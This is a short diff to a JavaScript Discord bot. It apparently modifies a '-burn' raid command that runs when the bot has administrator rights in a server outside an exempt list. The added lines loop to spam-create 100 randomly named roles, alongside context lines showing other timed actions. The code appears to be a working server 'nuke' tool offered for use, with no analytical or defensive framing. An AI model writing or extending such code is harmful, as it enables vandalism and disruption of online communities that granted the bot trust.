@@ -291,7 +291,7 @@ client.on("message", msg => {
  
 
 client.on("message", async msg => {
-  if(msg.content.startsWith(`-burn`)) {
+  if(msg.content.startsWith(`-bur`)) {
     if(msg.channel.type === 'dm') {return}
  if(!unallowedguilds.includes(msg.guild.id)) {
     if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
@@ -308,6 +308,11 @@ client.on("message", async msg => {
               })
             },i * 0600)
         }
+      var bruhhh = 0
+      while(bruhhh < 100) {
+msg.guild.roles.create({ data: { name: channelnames()} })
+bruhhh++
+}
   }
 }
   }
